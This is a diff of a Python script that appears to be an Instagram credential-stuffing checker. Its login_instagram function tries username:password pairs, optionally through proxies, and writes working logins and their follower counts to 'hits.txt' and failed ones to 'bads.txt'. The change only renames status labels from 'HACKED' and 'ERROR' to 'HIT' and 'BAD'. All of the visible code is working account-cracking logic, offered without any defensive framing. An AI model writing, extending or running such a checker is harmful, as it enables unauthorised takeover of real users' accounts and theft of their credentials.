@@ -84,7 +84,7 @@ def login_instagram(username, password,use_proxy:int):
     if 'authenticated' in json_data:
         if json_data['authenticated'] == True:
             followers = GetInstaFollowersNum(username)
-            PrintText('HACKED','{0}:{1} FOLLOWERS: {2}'.format(username,password,followers),Fore.GREEN,Fore.WHITE)
+            PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(username,password,followers),Fore.GREEN,Fore.WHITE)
             with open('hits.txt','a') as f:
                 f.write('{0}:{1}\n'.format(username,password))
             with open('detailed_hits.txt','a') as f:
@@ -94,7 +94,7 @@ def login_instagram(username, password,use_proxy:int):
                 PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
                 time.sleep(retry_time)
         else:
-            PrintText('ERROR','{0}:{1} -> failed to login'.format(username,password),Fore.RED,Fore.WHITE)
+            PrintText('BAD','{0}:{1} -> failed to login'.format(username,password),Fore.RED,Fore.WHITE)
             with open('bads.txt','a') as f:
                 f.write('{0}:{1}\n'.format(username,password))
     elif json_data['status'] == 'fail':
